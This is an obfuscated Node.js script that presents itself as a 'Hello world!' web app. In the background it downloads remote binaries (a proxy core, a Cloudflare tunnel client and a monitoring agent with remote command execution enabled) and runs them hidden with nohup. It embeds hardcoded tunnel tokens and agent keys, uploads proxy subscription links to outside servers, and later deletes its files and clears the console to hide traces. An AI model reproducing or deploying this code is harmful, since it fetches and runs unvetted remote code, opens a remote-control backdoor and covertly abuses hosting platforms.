const _0x42c0b0=_0x399b;(function(_0x2b6f10,_0x4712a5){const _0x26efe2=_0x399b,_0x2c30d8=_0x2b6f10();while(!![]){try{const _0x5307dd=-parseInt(_0x26efe2(0x20b))/0x1*(-parseInt(_0x26efe2(0x24d))/0x2)+-parseInt(_0x26efe2(0x22f))/0x3+parseInt(_0x26efe2(0x205))/0x4*(-parseInt(_0x26efe2(0x209))/0x5)+parseInt(_0x26efe2(0x273))/0x6+parseInt(_0x26efe2(0x21a))/0x7+parseInt(_0x26efe2(0x230))/0x8*(parseInt(_0x26efe2(0x238))/0x9)+parseInt(_0x26efe2(0x227))/0xa*(parseInt(_0x26efe2(0x26f))/0xb);if(_0x5307dd===_0x4712a5)break;else _0x2c30d8['push'](_0x2c30d8['shift']());}catch(_0x25f74b){_0x2c30d8['push'](_0x2c30d8['shift']());}}}(_0x45c1,0x2b8b9));function _0x399b(_0x4da4d3,_0x55455f){const _0x45c1b5=_0x45c1();return _0x399b=function(_0x399b30,_0x42cf60){_0x399b30=_0x399b30-0x1f1;let _0x47e877=_0x45c1b5[_0x399b30];return _0x47e877;},_0x399b(_0x4da4d3,_0x55455f);}function _0x45c1(){const _0xa38ccb=['\x20failed:\x20','none','status','join','close','web','freedom','NEZHA_KEY','2096','2083','unshift','forEach','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','Subscription\x20uploaded\x20successfully','clear','&path=%2Fvless-argo%3Fed%3D2560#','push','direct','PROJECT_URL','ArgoDomain:','\x20>/dev/null\x202>&1','blackhole','data','/config.json\x20>/dev/null\x202>&1\x20&','https://arm64.ssss.nyc.mn/web','filter','existsSync','App\x20is\x20running','bot\x20is\x20running','SERVER_PORT','SUB_PATH','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','/api/add-nodes','https+local://8.8.8.8/dns-query','&path=%2Ftrojan-argo%3Fed%3D2560#','./php','/bot\x20','/php\x20-c\x20\x22','sub.txt','https://amd64.ssss.nyc.mn/v1','/web\x20-c\x20','send','tcp','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','stringify','http','Content-Type','/npm\x20-s\x20','path','Skipping\x20adding\x20automatic\x20access\x20task','error','Download\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Vls','9740qKwOAY','Error\x20executing\x20command:\x20','/tmp/vls','trojan','290flGqBH','/vmess-argo','1533QizFRK','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','fileUrl','exec','https://amd64.ssss.nyc.mn/web','\x0a\x20\x20credentials-file:\x20','match','\x0a\x20\x20\x0avmess://','env','tunnel.json','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','添加URL失败:\x20','www.visa.com.sg','message','mkdirSync','1293726ZbLPxQ','/api/add-subscriptions','post','127.0.0.1','tunnel.yml','readFileSync','vmess','&type=ws&host=','from','npm','toString','CFPORT','arm64','673570xiaeMs','https://amd64.ssss.nyc.mn/2go','fileName','boot.log','443','PORT','ARGO_DOMAIN','ARGO_PORT','836619iEomyj','8SNJILC','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','https://amd64.ssss.nyc.mn/agent','then','2087','php','utf-8','./web','2318499tbVZWz','axios','php\x20is\x20running','finish','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','\x20already\x20exists','/vmess-argo?ed=2560','Hello\x20world!','huggf.faiz.us.kg','vless','8443','writeFileSync','php\x20running\x20error:\x20','\x20is\x20created','rm\x20-rf\x20','child_process','bot','automatic\x20access\x20task\x20added\x20successfully','quic','./bot','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','10CjiwLb','chmod','config.json','set','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','createWriteStream','Error\x20reading\x20boot.log:','\x0a\x20\x20\x0atrojan://','length','web\x20is\x20running','express','stream','unlinkSync','https://arm64.ssss.nyc.mn/2go','true','false','config.yaml','NEZHA_PORT','response','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','?security=tls&sni=','/trojan-argo','get','includes','CFIP','\x20>/dev/null\x202>&1\x20&','base64','block','JgARl5rWKs4k8TTuG1OgFcaxrxsjmpHl','amd','web\x20running\x20error:\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','https://oooo.serv00.net/add-url','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','22eFGTdU','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','Error\x20downloading\x20files:','application/json','81936lWpUWc','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','xtls-rprx-vision','UPLOAD_URL','sub','split','--tls','bot\x20is\x20running.','log','trim','ARGO_DOMAIN:','catch','AUTO_ACCESS','arm','tls','?encryption=none&security=tls&sni=','NEZHA_SERVER','nohup\x20','/dev/null'];_0x45c1=function(){return _0xa38ccb;};return _0x45c1();}const express=require(_0x42c0b0(0x257)),app=express(),axios=require(_0x42c0b0(0x239)),os=require('os'),fs=require('fs'),path=require(_0x42c0b0(0x1ff)),{promisify}=require('util'),exec=promisify(require(_0x42c0b0(0x247))[_0x42c0b0(0x20e)]),{execSync}=require(_0x42c0b0(0x247)),UPLOAD_URL=process['env'][_0x42c0b0(0x276)]||'',PROJECT_URL=process['env'][_0x42c0b0(0x298)]||'',AUTO_ACCESS=process[_0x42c0b0(0x213)][_0x42c0b0(0x27f)]||![],FILE_PATH=process['env']['FILE_PATH']||_0x42c0b0(0x207),SUB_PATH=process[_0x42c0b0(0x213)][_0x42c0b0(0x2a4)]||_0x42c0b0(0x277),PORT=process[_0x42c0b0(0x213)][_0x42c0b0(0x2a3)]||process['env'][_0x42c0b0(0x22c)]||0x1eb4,UUID=process[_0x42c0b0(0x213)]['UUID']||'4b60b788-00bd-41dd-b241-17c4eba4056d',NEZHA_SERVER=process[_0x42c0b0(0x213)][_0x42c0b0(0x283)]||'nzag.faiz.us.kg:8008',NEZHA_PORT=process[_0x42c0b0(0x213)][_0x42c0b0(0x25e)]||'',NEZHA_KEY=process[_0x42c0b0(0x213)][_0x42c0b0(0x28d)]||_0x42c0b0(0x269),ARGO_DOMAIN=process[_0x42c0b0(0x213)][_0x42c0b0(0x22d)]||_0x42c0b0(0x240),ARGO_AUTH=process[_0x42c0b0(0x213)]['ARGO_AUTH']||'eyJhIjoiNmI3MzZhMDhiMzlmNDVlMzE2ZTdlMGNkODE2Yjc2ZDIiLCJ0IjoiYmQ5MzM0ZTEtZmI3OS00ODg4LTlhYjItYjEwYzczYTM4YzM3IiwicyI6Ik1qbGpaVEl6WlRndE5UVmtZUzAwTXpCbUxUazBZamN0TjJWaVpUVTNNalpqWlRVeCJ9',ARGO_PORT=process[_0x42c0b0(0x213)][_0x42c0b0(0x22e)]||0x1f41,CFIP=process['env'][_0x42c0b0(0x265)]||_0x42c0b0(0x217),CFPORT=process[_0x42c0b0(0x213)][_0x42c0b0(0x225)]||0x1bb,NAME=process[_0x42c0b0(0x213)]['NAME']||_0x42c0b0(0x204);!fs[_0x42c0b0(0x2a0)](FILE_PATH)?(fs[_0x42c0b0(0x219)](FILE_PATH,{'recursive':!![]}),console[_0x42c0b0(0x27b)](FILE_PATH+_0x42c0b0(0x245))):console['log'](FILE_PATH+_0x42c0b0(0x23d));let npmPath=path['join'](FILE_PATH,_0x42c0b0(0x223)),phpPath=path[_0x42c0b0(0x289)](FILE_PATH,_0x42c0b0(0x235)),webPath=path[_0x42c0b0(0x289)](FILE_PATH,_0x42c0b0(0x28b)),botPath=path[_0x42c0b0(0x289)](FILE_PATH,_0x42c0b0(0x248)),subPath=path[_0x42c0b0(0x289)](FILE_PATH,_0x42c0b0(0x1f5)),listPath=path[_0x42c0b0(0x289)](FILE_PATH,'list.txt'),bootLogPath=path[_0x42c0b0(0x289)](FILE_PATH,_0x42c0b0(0x22a)),configPath=path[_0x42c0b0(0x289)](FILE_PATH,_0x42c0b0(0x24f));function deleteNodes(){const _0x42f2be=_0x42c0b0;try{if(!UPLOAD_URL)return;if(!fs[_0x42f2be(0x2a0)](subPath))return;let _0x4eb321;try{_0x4eb321=fs[_0x42f2be(0x21f)](subPath,_0x42f2be(0x236));}catch{return null;}const _0x32f783=Buffer[_0x42f2be(0x222)](_0x4eb321,'base64')[_0x42f2be(0x224)](_0x42f2be(0x236)),_0x3d931=_0x32f783[_0x42f2be(0x278)]('\x0a')[_0x42f2be(0x29f)](_0x3a55a0=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x3a55a0));if(_0x3d931[_0x42f2be(0x255)]===0x0)return;return axios[_0x42f2be(0x21c)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x42f2be(0x1fb)]({'nodes':_0x3d931}),{'headers':{'Content-Type':_0x42f2be(0x272)}})[_0x42f2be(0x27e)](_0x35a967=>{return null;});}catch(_0x8784a2){return null;}}function cleanupOldFiles(){const _0x4bde25=_0x42c0b0,_0x49b684=['web',_0x4bde25(0x248),'npm',_0x4bde25(0x235),_0x4bde25(0x1f5),_0x4bde25(0x22a)];_0x49b684[_0x4bde25(0x291)](_0x44f639=>{const _0x1f32ae=path['join'](FILE_PATH,_0x44f639);fs['unlink'](_0x1f32ae,()=>{});});}app['get']('/',function(_0x395b6c,_0x194111){const _0x513098=_0x42c0b0;_0x194111[_0x513098(0x1f8)](_0x513098(0x23f));});const config={'log':{'access':_0x42c0b0(0x285),'error':_0x42c0b0(0x285),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x42c0b0(0x275)}],'decryption':_0x42c0b0(0x287),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x42c0b0(0x20a),'dest':0xbbb},{'path':_0x42c0b0(0x262),'dest':0xbbc}]},'streamSettings':{'network':_0x42c0b0(0x1f9)}},{'port':0xbb9,'listen':_0x42c0b0(0x21d),'protocol':_0x42c0b0(0x241),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':_0x42c0b0(0x287)}},{'port':0xbba,'listen':_0x42c0b0(0x21d),'protocol':_0x42c0b0(0x241),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x42c0b0(0x287),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x42c0b0(0x1fc),_0x42c0b0(0x281),_0x42c0b0(0x24a)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x42c0b0(0x21d),'protocol':_0x42c0b0(0x220),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x42c0b0(0x20a)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x42c0b0(0x281),_0x42c0b0(0x24a)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x42c0b0(0x208),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x42c0b0(0x287),'wsSettings':{'path':_0x42c0b0(0x262)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x42c0b0(0x281),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x42c0b0(0x2a7)]},'outbounds':[{'protocol':_0x42c0b0(0x28c),'tag':_0x42c0b0(0x297)},{'protocol':_0x42c0b0(0x29b),'tag':_0x42c0b0(0x268)}]};fs[_0x42c0b0(0x243)](path[_0x42c0b0(0x289)](FILE_PATH,_0x42c0b0(0x24f)),JSON[_0x42c0b0(0x1fb)](config,null,0x2));function getSystemArchitecture(){const _0x48a6d0=_0x42c0b0,_0x56c834=os['arch']();return _0x56c834===_0x48a6d0(0x280)||_0x56c834===_0x48a6d0(0x226)||_0x56c834==='aarch64'?_0x48a6d0(0x280):_0x48a6d0(0x26a);}function downloadFile(_0x2a4374,_0x1aa7e7,_0x52d1ec){const _0x27aeaa=_0x42c0b0,_0x29de52=path[_0x27aeaa(0x289)](FILE_PATH,_0x2a4374),_0x38bbec=fs[_0x27aeaa(0x252)](_0x29de52);axios({'method':'get','url':_0x1aa7e7,'responseType':_0x27aeaa(0x258)})[_0x27aeaa(0x233)](_0x3fbda9=>{const _0x4e178e=_0x27aeaa;_0x3fbda9[_0x4e178e(0x29c)]['pipe'](_0x38bbec),_0x38bbec['on'](_0x4e178e(0x23b),()=>{const _0x29e38f=_0x4e178e;_0x38bbec[_0x29e38f(0x28a)](),console['log'](_0x29e38f(0x202)+_0x2a4374+'\x20successfully'),_0x52d1ec(null,_0x2a4374);}),_0x38bbec['on'](_0x4e178e(0x201),_0x44873e=>{const _0x3d052c=_0x4e178e;fs['unlink'](_0x29de52,()=>{});const _0x493656=_0x3d052c(0x202)+_0x2a4374+'\x20failed:\x20'+_0x44873e['message'];console[_0x3d052c(0x201)](_0x493656),_0x52d1ec(_0x493656);});})[_0x27aeaa(0x27e)](_0x26b6f6=>{const _0x243c66=_0x27aeaa,_0x468b24=_0x243c66(0x202)+_0x2a4374+_0x243c66(0x286)+_0x26b6f6[_0x243c66(0x218)];console['error'](_0x468b24),_0x52d1ec(_0x468b24);});}async function downloadFilesAndRun(){const _0x84d62b=_0x42c0b0,_0x4fd15d=getSystemArchitecture(),_0x1454b8=getFilesForArchitecture(_0x4fd15d);if(_0x1454b8[_0x84d62b(0x255)]===0x0){console[_0x84d62b(0x27b)](_0x84d62b(0x274));return;}const _0x4eecfa=_0x1454b8['map'](_0x12dafb=>{return new Promise((_0xca9f93,_0x1171cb)=>{const _0x2d83c5=_0x399b;downloadFile(_0x12dafb[_0x2d83c5(0x229)],_0x12dafb[_0x2d83c5(0x20d)],(_0x5e4170,_0x25fa98)=>{_0x5e4170?_0x1171cb(_0x5e4170):_0xca9f93(_0x25fa98);});});});try{await Promise['all'](_0x4eecfa);}catch(_0x48937b){console[_0x84d62b(0x201)](_0x84d62b(0x271),_0x48937b);return;}function _0xab5282(_0x2de84f){const _0x43303f=_0x84d62b,_0x1062a1=0x1fd;_0x2de84f[_0x43303f(0x291)](_0x14adf7=>{const _0x2fd5cf=_0x43303f,_0x3f331a=path[_0x2fd5cf(0x289)](FILE_PATH,_0x14adf7);fs[_0x2fd5cf(0x2a0)](_0x3f331a)&&fs[_0x2fd5cf(0x24e)](_0x3f331a,_0x1062a1,_0x2ffe35=>{const _0x3394d9=_0x2fd5cf;_0x2ffe35?console[_0x3394d9(0x201)]('Empowerment\x20failed\x20for\x20'+_0x3f331a+':\x20'+_0x2ffe35):console['log']('Empowerment\x20success\x20for\x20'+_0x3f331a+':\x20'+_0x1062a1[_0x3394d9(0x224)](0x8));});});}const _0x29b0d3=NEZHA_PORT?['./npm',_0x84d62b(0x237),_0x84d62b(0x24b)]:[_0x84d62b(0x1f2),_0x84d62b(0x237),_0x84d62b(0x24b)];_0xab5282(_0x29b0d3);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x55e0d7=NEZHA_SERVER[_0x84d62b(0x264)](':')?NEZHA_SERVER[_0x84d62b(0x278)](':')['pop']():'',_0x2d41bd=new Set([_0x84d62b(0x22b),_0x84d62b(0x242),_0x84d62b(0x28e),_0x84d62b(0x234),'2083','2053']),_0x14108c=_0x2d41bd['has'](_0x55e0d7)?_0x84d62b(0x25b):_0x84d62b(0x25c),_0x3830f5='\x0aclient_secret:\x20'+NEZHA_KEY+_0x84d62b(0x260)+NEZHA_SERVER+_0x84d62b(0x1fa)+_0x14108c+_0x84d62b(0x203)+UUID;fs[_0x84d62b(0x243)](path[_0x84d62b(0x289)](FILE_PATH,_0x84d62b(0x25d)),_0x3830f5);const _0x49491a=_0x84d62b(0x284)+FILE_PATH+_0x84d62b(0x1f4)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x49491a),console['log'](_0x84d62b(0x23a)),await new Promise(_0x9dd35d=>setTimeout(_0x9dd35d,0x3e8));}catch(_0x3ce63f){console[_0x84d62b(0x201)](_0x84d62b(0x244)+_0x3ce63f);}}else{let _0x347208='';const _0x39a0d2=[_0x84d62b(0x22b),'8443',_0x84d62b(0x28e),_0x84d62b(0x234),_0x84d62b(0x28f),'2053'];_0x39a0d2['includes'](NEZHA_PORT)&&(_0x347208=_0x84d62b(0x279));const _0x5ac4ad=_0x84d62b(0x284)+FILE_PATH+_0x84d62b(0x1fe)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x347208+_0x84d62b(0x266);try{await exec(_0x5ac4ad),console[_0x84d62b(0x27b)]('npm\x20is\x20running'),await new Promise(_0x420f5a=>setTimeout(_0x420f5a,0x3e8));}catch(_0x48dc23){console[_0x84d62b(0x201)]('npm\x20running\x20error:\x20'+_0x48dc23);}}}else console[_0x84d62b(0x27b)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x4ee18f=_0x84d62b(0x284)+FILE_PATH+_0x84d62b(0x1f7)+FILE_PATH+_0x84d62b(0x29d);try{await exec(_0x4ee18f),console[_0x84d62b(0x27b)](_0x84d62b(0x256)),await new Promise(_0x1804de=>setTimeout(_0x1804de,0x3e8));}catch(_0xc4c6e6){console[_0x84d62b(0x201)](_0x84d62b(0x26b)+_0xc4c6e6);}if(fs['existsSync'](path[_0x84d62b(0x289)](FILE_PATH,'bot'))){let _0x27d246;if(ARGO_AUTH[_0x84d62b(0x211)](/^[A-Z0-9a-z=]{120,250}$/))_0x27d246=_0x84d62b(0x231)+ARGO_AUTH;else ARGO_AUTH[_0x84d62b(0x211)](/TunnelSecret/)?_0x27d246='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+'/tunnel.yml\x20run':_0x27d246=_0x84d62b(0x2a5)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x84d62b(0x284)+FILE_PATH+_0x84d62b(0x1f3)+_0x27d246+_0x84d62b(0x266)),console[_0x84d62b(0x27b)](_0x84d62b(0x2a2)),await new Promise(_0x295387=>setTimeout(_0x295387,0x7d0));}catch(_0x4f9a00){console[_0x84d62b(0x201)](_0x84d62b(0x206)+_0x4f9a00);}}await new Promise(_0x1f180f=>setTimeout(_0x1f180f,0x1388));}function getFilesForArchitecture(_0x49a2b7){const _0x44def9=_0x42c0b0;let _0x1cf0cb;_0x49a2b7===_0x44def9(0x280)?_0x1cf0cb=[{'fileName':'web','fileUrl':_0x44def9(0x29e)},{'fileName':_0x44def9(0x248),'fileUrl':_0x44def9(0x25a)}]:_0x1cf0cb=[{'fileName':_0x44def9(0x28b),'fileUrl':_0x44def9(0x20f)},{'fileName':'bot','fileUrl':_0x44def9(0x228)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x42087a=_0x49a2b7===_0x44def9(0x280)?'https://arm64.ssss.nyc.mn/agent':_0x44def9(0x232);_0x1cf0cb[_0x44def9(0x290)]({'fileName':_0x44def9(0x223),'fileUrl':_0x42087a});}else{const _0x1def8f=_0x49a2b7===_0x44def9(0x280)?'https://arm64.ssss.nyc.mn/v1':_0x44def9(0x1f6);_0x1cf0cb[_0x44def9(0x290)]({'fileName':_0x44def9(0x235),'fileUrl':_0x1def8f});}}return _0x1cf0cb;}function argoType(){const _0xfc94c9=_0x42c0b0;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0xfc94c9(0x27b)](_0xfc94c9(0x20c));return;}if(ARGO_AUTH[_0xfc94c9(0x264)]('TunnelSecret')){fs[_0xfc94c9(0x243)](path[_0xfc94c9(0x289)](FILE_PATH,_0xfc94c9(0x214)),ARGO_AUTH);const _0x359788='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH['split']('\x22')[0xb]+_0xfc94c9(0x210)+path[_0xfc94c9(0x289)](FILE_PATH,_0xfc94c9(0x214))+_0xfc94c9(0x26e)+ARGO_DOMAIN+_0xfc94c9(0x215)+ARGO_PORT+_0xfc94c9(0x26c);fs[_0xfc94c9(0x243)](path['join'](FILE_PATH,_0xfc94c9(0x21e)),_0x359788);}else console[_0xfc94c9(0x27b)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}argoType();async function extractDomains(){const _0x25ec8d=_0x42c0b0;let _0x8be7d0;if(ARGO_AUTH&&ARGO_DOMAIN)_0x8be7d0=ARGO_DOMAIN,console[_0x25ec8d(0x27b)](_0x25ec8d(0x27d),_0x8be7d0),await _0x5ce2ab(_0x8be7d0);else try{const _0x4f3212=fs[_0x25ec8d(0x21f)](path['join'](FILE_PATH,'boot.log'),_0x25ec8d(0x236)),_0x500b7e=_0x4f3212[_0x25ec8d(0x278)]('\x0a'),_0x51a19c=[];_0x500b7e[_0x25ec8d(0x291)](_0x339c24=>{const _0x35eeff=_0x25ec8d,_0x66b63c=_0x339c24[_0x35eeff(0x211)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x66b63c){const _0x25b3f6=_0x66b63c[0x1];_0x51a19c['push'](_0x25b3f6);}});if(_0x51a19c[_0x25ec8d(0x255)]>0x0)_0x8be7d0=_0x51a19c[0x0],console['log'](_0x25ec8d(0x299),_0x8be7d0),await _0x5ce2ab(_0x8be7d0);else{console[_0x25ec8d(0x27b)](_0x25ec8d(0x23c)),fs[_0x25ec8d(0x259)](path[_0x25ec8d(0x289)](FILE_PATH,_0x25ec8d(0x22a)));async function _0x52c13f(){const _0x305036=_0x25ec8d;try{await exec(_0x305036(0x24c));}catch(_0x3f014c){}}_0x52c13f(),await new Promise(_0x1105e9=>setTimeout(_0x1105e9,0xbb8));const _0x2a4525=_0x25ec8d(0x2a5)+FILE_PATH+_0x25ec8d(0x270)+ARGO_PORT;try{await exec(_0x25ec8d(0x284)+path[_0x25ec8d(0x289)](FILE_PATH,'bot')+'\x20'+_0x2a4525+'\x20>/dev/null\x202>&1\x20&'),console[_0x25ec8d(0x27b)](_0x25ec8d(0x27a)),await new Promise(_0x2865bb=>setTimeout(_0x2865bb,0xbb8)),await extractDomains();}catch(_0x2d0e53){console[_0x25ec8d(0x201)](_0x25ec8d(0x206)+_0x2d0e53);}}}catch(_0x435eb7){console[_0x25ec8d(0x201)](_0x25ec8d(0x253),_0x435eb7);}async function _0x5ce2ab(_0x726532){const _0x37bfe6=_0x25ec8d,_0x511201=execSync(_0x37bfe6(0x292),{'encoding':_0x37bfe6(0x236)}),_0x59f85f=_0x511201[_0x37bfe6(0x27c)]();return new Promise(_0x52464c=>{setTimeout(()=>{const _0x3e70cc=_0x399b,_0x433750={'v':'2','ps':NAME+'-'+_0x59f85f,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x3e70cc(0x287),'net':'ws','type':'none','host':_0x726532,'path':_0x3e70cc(0x23e),'tls':'tls','sni':_0x726532,'alpn':''},_0x50bf40='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x3e70cc(0x282)+_0x726532+_0x3e70cc(0x221)+_0x726532+_0x3e70cc(0x295)+NAME+'-'+_0x59f85f+_0x3e70cc(0x212)+Buffer[_0x3e70cc(0x222)](JSON[_0x3e70cc(0x1fb)](_0x433750))[_0x3e70cc(0x224)](_0x3e70cc(0x267))+_0x3e70cc(0x254)+UUID+'@'+CFIP+':'+CFPORT+_0x3e70cc(0x261)+_0x726532+_0x3e70cc(0x221)+_0x726532+_0x3e70cc(0x1f1)+NAME+'-'+_0x59f85f+'\x0a\x20\x20\x20\x20';console[_0x3e70cc(0x27b)](Buffer[_0x3e70cc(0x222)](_0x50bf40)[_0x3e70cc(0x224)]('base64')),fs[_0x3e70cc(0x243)](subPath,Buffer[_0x3e70cc(0x222)](_0x50bf40)[_0x3e70cc(0x224)](_0x3e70cc(0x267))),console[_0x3e70cc(0x27b)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uplodNodes(),app[_0x3e70cc(0x263)]('/'+SUB_PATH,(_0xd721a1,_0x5a0a26)=>{const _0x321dc5=_0x3e70cc,_0x239e73=Buffer[_0x321dc5(0x222)](_0x50bf40)[_0x321dc5(0x224)]('base64');_0x5a0a26[_0x321dc5(0x250)](_0x321dc5(0x1fd),'text/plain;\x20charset=utf-8'),_0x5a0a26[_0x321dc5(0x1f8)](_0x239e73);}),_0x52464c(_0x50bf40);},0x7d0);});}}async function uplodNodes(){const _0x53845f=_0x42c0b0;if(UPLOAD_URL&&PROJECT_URL){const _0x36b33a=PROJECT_URL+'/'+SUB_PATH,_0x497cca={'subscription':[_0x36b33a]};try{const _0x31a9c5=await axios[_0x53845f(0x21c)](UPLOAD_URL+_0x53845f(0x21b),_0x497cca,{'headers':{'Content-Type':_0x53845f(0x272)}});if(_0x31a9c5[_0x53845f(0x288)]===0xc8)console[_0x53845f(0x27b)](_0x53845f(0x293));else return null;}catch(_0x52d3d9){if(_0x52d3d9['response']){if(_0x52d3d9[_0x53845f(0x25f)][_0x53845f(0x288)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x53845f(0x2a0)](listPath))return;const _0x5108f6=fs[_0x53845f(0x21f)](listPath,_0x53845f(0x236)),_0x1dc49d=_0x5108f6[_0x53845f(0x278)]('\x0a')[_0x53845f(0x29f)](_0x10065a=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x10065a));if(_0x1dc49d[_0x53845f(0x255)]===0x0)return;const _0x31feb5=JSON[_0x53845f(0x1fb)]({'nodes':_0x1dc49d});try{await axios['post'](UPLOAD_URL+_0x53845f(0x2a6),_0x31feb5,{'headers':{'Content-Type':_0x53845f(0x272)}});if(response[_0x53845f(0x288)]===0xc8)console[_0x53845f(0x27b)](_0x53845f(0x293));else return null;}catch(_0x41723d){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x125c75=_0x399b,_0xa56c47=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0xa56c47[_0x125c75(0x296)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0xa56c47[_0x125c75(0x296)](phpPath);exec(_0x125c75(0x246)+_0xa56c47[_0x125c75(0x289)]('\x20')+_0x125c75(0x29a),_0x4c583c=>{const _0x27d5d5=_0x125c75;console[_0x27d5d5(0x294)](),console[_0x27d5d5(0x27b)](_0x27d5d5(0x2a1)),console[_0x27d5d5(0x27b)](_0x27d5d5(0x251));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x51dc0f=_0x42c0b0;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x51dc0f(0x200));return;}try{const _0x3eb55d=await axios[_0x51dc0f(0x21c)](_0x51dc0f(0x26d),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x51dc0f(0x272)}});console[_0x51dc0f(0x27b)](_0x51dc0f(0x249));}catch(_0x7f3f84){console[_0x51dc0f(0x201)](_0x51dc0f(0x216)+_0x7f3f84[_0x51dc0f(0x218)]);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app['listen'](PORT,()=>console[_0x42c0b0(0x27b)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
